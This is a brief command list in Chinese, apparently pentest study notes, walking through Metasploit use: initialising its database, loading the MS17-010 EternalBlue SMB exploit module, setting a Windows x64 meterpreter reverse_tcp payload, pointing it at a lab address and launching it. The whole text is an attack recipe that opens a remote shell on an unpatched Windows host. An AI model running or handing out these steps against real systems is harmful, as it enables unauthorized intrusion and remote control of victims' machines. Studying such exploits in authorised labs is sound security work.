	>systemctl start postgresql.service 启动数据库服务
	>msfdb init 初始化数据库
	>msfconsole进入MSF框架
	>search  ms17-010 查找攻击模块
	>use exploit/windows/smb/ms17_010_eternalblue 使用模块 
	>set payload windows/x64/meterpreter/reverse_tcp 设置载荷
	>info 查看信息
	>show options查看需要设置的参数
	>set RHOST 192.168.125.138设置参数
	>exploit 执行攻击模块
	>back 回退